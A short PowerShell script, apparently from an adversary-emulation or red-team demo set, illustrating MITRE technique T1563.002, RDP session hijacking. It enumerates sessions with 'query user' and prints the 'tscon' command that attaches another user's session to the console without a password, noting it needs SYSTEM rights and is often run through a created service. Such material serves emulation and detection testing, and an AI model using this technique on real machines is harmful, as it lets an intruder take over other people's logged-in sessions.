Write-Host "[*] T1563.002 - Remote Service Session Hijacking: RDP Hijacking"

Write-Host "[*] Enumerating Sessions (query user):"
query user

Write-Host "[*] Attack Command (tscon):"
Write-Host "    tscon <SessionID> /dest:<TargetSessionName>"
Write-Host "    Example: tscon 2 /dest:console"
Write-Host "    Result: Swaps the RDP session to the physical console (or another session) without a password!"

Write-Host "[!] Note: Requires SYSTEM privileges. Often paired with creating a service to run tscon."
